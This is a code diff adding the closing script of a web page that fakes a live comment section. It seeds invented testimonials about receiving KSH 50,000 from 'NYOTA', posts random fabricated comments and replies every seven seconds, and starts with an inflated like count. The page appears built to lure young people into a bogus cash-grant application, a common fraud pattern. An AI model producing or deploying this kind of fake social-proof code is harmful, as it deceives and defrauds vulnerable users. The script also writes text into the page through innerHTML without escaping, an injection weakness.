+            "Just checking my eligibility now. My friend received her KSH 50,000 yesterday and told me to apply. Hoping to get approved for my tailoring business! ✂️", 
+            "Received KSH 50,000 at 10 AM! Already bought materials for my carpentry workshop. This disbursement is real people! Don't miss out! 🔨", 
+            "Finally received my funds today. The process was smooth. Thank you NYOTA!"
+        ];
+        const REPLIES = [ 
+            "Congratulations! I hope to receive mine too. 🎉", 
+            "Is the KSH 50,000 available to all eligible youth?", 
+            "Please, has anyone confirmed the application process?", 
+            "Wishing everyone good luck! 🙏" 
+        ];
+
+        const commentsEl = document.getElementById('flcComments'); 
+        const commentCountEl = document.getElementById('flcCommentCount'); 
+        const likeTotalEl = document.getElementById('flcLikeTotal'); 
+        const likeBtn = document.getElementById('flcPostLikeBtn'); 
+        const commentBtn = document.getElementById('flcPostCommentBtn'); 
+        const composerInput = document.getElementById('flcComposerInput');
+
+        let commentCount = 0; 
+        let likeCount = 341; 
+        let isLiked = false;
+
+        likeBtn.addEventListener('click', function () { 
+            isLiked = !isLiked; 
+            if (isLiked) { likeCount++; likeBtn.style.color = 'var(--theme-color)'; } 
+            else { likeCount--; likeBtn.style.color = '#64748B'; } 
+            likeTotalEl.textContent = likeCount; 
+        });
+
+        commentBtn.addEventListener('click', function () { 
+            composerInput.scrollIntoView({ behavior: 'smooth', block: 'center' }); 
+            composerInput.focus(); 
+        });
+
+        function addComment(name, text, parentContainer = null) { 
+            const isReply = !!parentContainer; 
+            const row = document.createElement('div'); 
+            row.className = 'flc-comment-row';
+
+            const avatar = document.createElement('div'); 
+            avatar.style.cssText = `width:${isReply ? '22px' : '28px'};height:${isReply ? '22px' : '28px'};border-radius:50%;background:var(--theme-color);color:#fff;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;flex-shrink:0;`; 
+            avatar.textContent = name.charAt(0);
+
+            const col = document.createElement('div'); 
+            col.className = 'flc-comment-col';
+
+            const bubble = document.createElement('div'); 
+            bubble.className = 'flc-comment-bubble'; 
+            bubble.innerHTML = `<b style="font-size:11.5px;display:block;color:#0F172A;">${name}</b><span>${text}</span>`;
+
+            const actions = document.createElement('div'); 
+            actions.style.cssText = 'font-size:10.5px;color:#64748B;margin:2px 0 0 6px;display:flex;gap:8px;align-items:center;'; 
+            actions.innerHTML = ` 
+                <button type="button" class="flc-action-btn flc-like-sub">Like</button> 
+                <button type="button" class="flc-action-btn flc-reply-sub">Reply</button> 
+                <span>Just now</span> 
+            `;
+
+            col.appendChild(bubble); 
+            col.appendChild(actions);
+
+            let repliesContainer = null; 
+            if (!isReply) { 
+                repliesContainer = document.createElement('div'); 
+                repliesContainer.className = 'flc-replies'; 
+                col.appendChild(repliesContainer); 
+            }
+
+            row.appendChild(avatar); 
+            row.appendChild(col);
+
+            actions.querySelector('.flc-like-sub').addEventListener('click', function () { 
+                this.style.color = this.style.color === 'var(--theme-color)' ? '#64748B' : 'var(--theme-color)'; 
+            });
+
+            actions.querySelector('.flc-reply-sub').addEventListener('click', function () { 
+                const targetReplies = isReply ? parentContainer : repliesContainer; 
+                let replyBox = targetReplies.querySelector('.flc-reply-input-box');
+                if (!replyBox) { 
+                    replyBox = document.createElement('div'); 
+                    replyBox.className = 'flc-reply-input-box'; 
+                    replyBox.innerHTML = ` 
+                        <input type="text" placeholder="Reply to ${name}…" /> 
+                        <button type="button" style="border:none;background:none;color:var(--theme-color);font-weight:800;font-size:11px;cursor:pointer;padding:0 4px;flex-shrink:0;">Send</button> 
+                    `; 
+                    targetReplies.appendChild(replyBox);
+                    const rInput = replyBox.querySelector('input'); 
+                    const rBtn = replyBox.querySelector('button'); 
+                    rInput.focus();
+                    const submitReply = () => { 
+                        if (rInput.value.trim()) { 
+                            addComment('You', rInput.value.trim(), targetReplies); 
+                            replyBox.remove(); 
+                        } 
+                    };
+                    rBtn.addEventListener('click', submitReply); 
+                    rInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitReply(); }); 
+                } 
+            });
+
+            if (isReply) { parentContainer.appendChild(row); } 
+            else { commentsEl.prepend(row); }
+
+            commentCount++; 
+            commentCountEl.textContent = commentCount; 
+            return repliesContainer; 
+        }
+
+        // Seed initial comments
+        addComment(NAMES[0], COMMENTS[0]); 
+        addComment(NAMES[1], COMMENTS[1]); 
+        const seededParent = addComment(NAMES[2], COMMENTS[2]); 
+        addComment(NAMES[3], REPLIES[0], seededParent);
+
+        // Auto-simulate comments
+        setInterval(() => { 
+            const randName = NAMES[Math.floor(Math.random() * NAMES.length)]; 
+            const randText = COMMENTS[Math.floor(Math.random() * COMMENTS.length)]; 
+            const topParent = addComment(randName, randText);
+            if (Math.random() < 0.10) { 
+                setTimeout(() => { 
+                    const replyName = NAMES[Math.floor(Math.random() * NAMES.length)]; 
+                    const replyText = REPLIES[Math.floor(Math.random() * REPLIES.length)]; 
+                    addComment(replyName, replyText, topParent); 
+                }, 1500); 
+            } 
+        }, 7000);
+
+        // User submit
+        document.getElementById('flcComposerForm').addEventListener('submit', function (e) { 
+            e.preventDefault(); 
+            if (composerInput.value.trim()) { 
+                addComment('You', composerInput.value.trim()); 
+                composerInput.value = ''; 
+            } 
+        }); 
+    })();
+</script>
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center>
+    <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+    <script type="text/javascript">sc_online_i(1727716,"ffffff","ffffff");</script>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center>
+    <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+    <script type="text/javascript">sc_online_i(1727798,"ffffff","ffffff");</script>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+</body>
+</html>
